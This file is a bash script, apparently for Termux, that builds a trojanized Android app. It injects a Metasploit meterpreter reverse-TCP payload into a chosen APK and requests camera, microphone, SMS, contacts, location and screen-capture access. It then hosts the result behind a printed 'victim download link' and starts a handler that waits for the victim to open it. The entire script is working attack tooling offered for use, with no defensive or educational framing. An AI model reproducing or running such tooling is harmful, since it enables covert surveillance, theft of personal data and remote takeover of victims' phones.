#!/bin/bash
# ============================================
# APK Payload Injector - All Permissions
# Kali Inside Termux
# ============================================

clear
cat << 'EOF'

  _____       _           _              _____  _  __
 |_   _|     (_)         | |       /\   |  __ \| |/ /
   | |  _ __  _  ___  ___| |_     /  \  | |__) | ' / 
   | | | '_ \| |/ _ \/ __| __|   / /\ \ |  ___/|  <  
  _| |_| | | | |  __/ (__| |_   / ____ \| |    | . \ 
 |_____|_| |_| |\___|\___|\__| /_/    \_\_|    |_|\_\ 
            _/ |                                     
           |__/                 Version : Kali Edition
                                Full Permissions
EOF

echo ""
echo -e "\e[1;36m========================================\e[0m"
echo -e "\e[1;32m  APK PAYLOAD INJECTOR - ALL PERMISSIONS\e[0m"
echo -e "\e[1;36m========================================\e[0m"
sleep 1

# ============================================
# STEP 1: Get IP
# ============================================
echo -e "\n\e[1;33m[*] Getting IP address...\e[0m"
LHOST=$(hostname -I 2>/dev/null | awk '{print $1}')
if [ -z "$LHOST" ]; then
    read -p "Enter your LHOST (e.g., 192.168.1.100): " LHOST
fi
echo -e "\e[1;32m[✓] LHOST: $LHOST\e[0m"

# ============================================
# STEP 2: Set PORT
# ============================================
LPORT=4444
echo -e "\e[1;32m[✓] LPORT: $LPORT\e[0m"

# ============================================
# STEP 3: Select APK
# ============================================
echo -e "\n\e[1;33m[*] Available APK files:\e[0m"
ls *.apk 2>/dev/null
echo ""
read -p "Enter APK name (e.g., hack.apk): " INPUT
read -p "Enter output name (e.g., binded.apk): " OUTPUT

if [ ! -f "$INPUT" ]; then
    echo -e "\e[1;31m[✗] $INPUT not found!\e[0m"
    exit 1
fi

# ============================================
# STEP 4: Fix apt lock
# ============================================
echo -e "\n\e[1;33m[*] Checking system...\e[0m"
killall apt apt-get dpkg 2>/dev/null
rm -rf /var/lib/dpkg/lock* /var/cache/apt/archives/lock 2>/dev/null
dpkg --configure -a 2>/dev/null

# ============================================
# STEP 5: Install Metasploit if missing
# ============================================
if ! command -v msfvenom &> /dev/null; then
    echo -e "\n\e[1;33m[*] Installing Metasploit Framework...\e[0m"
    echo -e "\e[1;31m[!] 15-20 minutes lagbe...\e[0m"
    apt update -y
    apt install metasploit-framework -y
else
    echo -e "\e[1;32m[✓] Metasploit already installed!\e[0m"
fi

# ============================================
# STEP 6: Inject Payload with ALL permissions
# ============================================
clear
echo -e "\e[1;36m========================================\e[0m"
echo -e "\e[1;32m    INJECTING PAYLOAD + PERMISSIONS\e[0m"
echo -e "\e[1;36m========================================\e[0m"
echo ""
echo -e " LHOST  : \e[1;32m$LHOST\e[0m"
echo -e " LPORT  : \e[1;32m$LPORT\e[0m"
echo -e " INPUT  : \e[1;32m$INPUT\e[0m"
echo -e " OUTPUT : \e[1;32m$OUTPUT\e[0m"
echo ""
echo -e "\e[1;33m[*] Adding Permissions:\e[0m"
echo -e "  📷 Camera"
echo -e "  🎤 Microphone"
echo -e "  📱 Screenshot/Screen Record"
echo -e "  📍 Location/GPS"
echo -e "  📂 Storage Read/Write"
echo -e "  📞 Phone State"
echo -e "  📨 SMS Read/Send"
echo -e "  📇 Contacts"
echo -e "  📹 Video Record"
echo -e "  🔔 Notification Access"
echo ""

msfvenom -x $INPUT \
  -p android/meterpreter/reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  AndroidRequestCameraAccess=true \
  AndroidRequestMicrophoneAccess=true \
  AndroidRequestLocationAccess=true \
  AndroidRequestStorageAccess=true \
  AndroidRequestPhoneStateAccess=true \
  AndroidRequestSMSAccess=true \
  AndroidRequestContactsAccess=true \
  AndroidRequestAudioRecordAccess=true \
  AndroidRequestVideoCaptureAccess=true \
  AndroidRequestScreenCaptureAccess=true \
  -o $OUTPUT

if [ $? -eq 0 ]; then
    echo ""
    echo -e "\e[1;36m========================================\e[0m"
    echo -e "\e[1;32m    [✓] SUCCESS! \e[0m"
    echo -e "\e[1;36m========================================\e[0m"
    echo ""
    echo -e "\e[1;33m[*] Added Permissions:\e[0m"
    echo -e "  ✅ Camera"
    echo -e "  ✅ Microphone"
    echo -e "  ✅ Screenshot/Screen Capture"
    echo -e "  ✅ Location/GPS"
    echo -e "  ✅ Storage"
    echo -e "  ✅ Audio Record"
    echo -e "  ✅ Video Capture"
    echo -e "  ✅ SMS"
    echo -e "  ✅ Contacts"
    echo -e "  ✅ Phone State"
    echo ""
    ls -lh $OUTPUT
    echo ""
    echo -e "\e[1;36m========================================\e[0m"
    echo -e "\e[1;32m  VICTIM DOWNLOAD LINK:\e[0m"
    echo -e "\e[1;33m  http://$LHOST:8080/$OUTPUT\e[0m"
    echo -e "\e[1;36m========================================\e[0m"
    echo ""
    
    # Apache start for hosting
    echo -e "\e[1;33m[*] Starting Web Server...\e[0m"
    service apache2 start 2>/dev/null || apachectl start 2>/dev/null
    cp $OUTPUT /var/www/html/ 2>/dev/null
    echo -e "\e[1;32m[✓] File hosted at: http://$LHOST:8080/$OUTPUT\e[0m"
    echo ""
    echo -e "\e[1;33m[*] Starting Metasploit Handler...\e[0m"
    echo -e "\e[1;31m[*] Wait for victim to install and open APK...\e[0m"
    echo ""
    
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set AutoRunScript post/multi/manage/shell_to_meterpreter; exploit;"
else
    echo -e "\e[1;31m[✗] Payload creation failed!\e[0m"
    exit 1
fi